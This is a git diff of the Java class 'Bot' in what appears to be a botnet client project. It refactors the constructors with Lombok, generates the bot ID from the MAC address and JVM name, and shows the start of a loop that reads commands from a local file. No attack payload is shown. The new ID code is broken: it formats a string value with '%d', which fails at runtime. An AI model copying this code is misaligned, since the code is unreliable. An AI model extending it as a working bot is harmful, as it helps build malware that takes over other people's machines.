@@ -31,8 +31,11 @@ import com.acmutv.botnet.bot.command.BotCommandParser;
 import com.acmutv.botnet.bot.command.CommandScope;
 import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.service.ConnectionService;
+import com.acmutv.botnet.tool.RuntimeManager;
 import lombok.AllArgsConstructor;
 import lombok.Data;
+import lombok.NoArgsConstructor;
+import lombok.NonNull;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -55,27 +58,18 @@ import java.util.concurrent.TimeUnit;
  */
 @Data
 @AllArgsConstructor
+@NoArgsConstructor
 public class Bot {
 
   private static final Logger LOGGER = LogManager.getLogger(Bot.class);
 
-  private String id;
-  private BotState state;
+  private String id = generateId();
+  private BotState state = BotState.INIT;
+  private BotPool pool = new BotPool();
+  @NonNull
   private AppConfiguration config;
-  private BotPool pool;
-  private boolean debug;
-
-  public Bot(AppConfiguration config) {
-    this(null, BotState.INIT, config, new BotPool(), false);
-  }
-
-  public Bot() {
-    this(null, BotState.INIT, new AppConfiguration(), new BotPool(), false);
-  }
 
   public void run() {
-    this.generateId();
-
     while (true) {
       BotCommand cmd = this.getNextCommand();
 
@@ -115,11 +109,13 @@ public class Bot {
     }
   }
 
-  private void generateId() {
-    String mac = ConnectionService.getMAC();
-    this.setId(mac);
-    LOGGER.info("ID generated {}", this.getId());
+  private String generateId() {
+    final String mac = ConnectionService.getMAC();
+    final String pid = RuntimeManager.getJvmName();
+    final String id = String.format("%s-%d", mac, pid);
+    return LOGGER.traceExit(id);
   }
+
   private BotCommand getNextCommand() {
     LOGGER.traceEntry();
     final String path = String.format("/home/%s/botnet/botcmd.txt", System.getenv("USER"));
